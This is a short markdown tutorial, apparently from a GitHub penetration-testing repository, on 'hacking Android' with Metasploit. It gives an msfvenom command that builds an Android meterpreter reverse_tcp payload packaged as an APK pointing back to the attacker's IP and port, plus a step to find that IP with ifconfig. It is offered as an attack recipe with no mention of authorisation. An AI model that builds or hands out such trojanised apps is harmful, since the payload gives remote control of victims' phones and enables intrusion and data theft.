after [Installing Metasploit](https://github.com/Muhammad-Mirab/Peneterator-Panter/blob/master/Insatlling%20Metasploit.md) now you are able to hack some devices like Android,Windows etc. and today we're going to show you how can you Hack Android

so at the first we need root permission then we have to build a payload for android!

`msfvenom -p android/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=4444 R > <the name that you wanna choose for your application>.apk`

![payload for android](https://cdn1.imggmi.com/uploads/2019/10/28/0cd4ae12e138046ae9ceac05f553381e-full.png)

you can find your ip address by executing `ifconfig`:

![ifconfig](https://cdn1.imggmi.com/uploads/2019/10/28/dd2c5976eb3908daf26c3418ab1063d0-full.png)
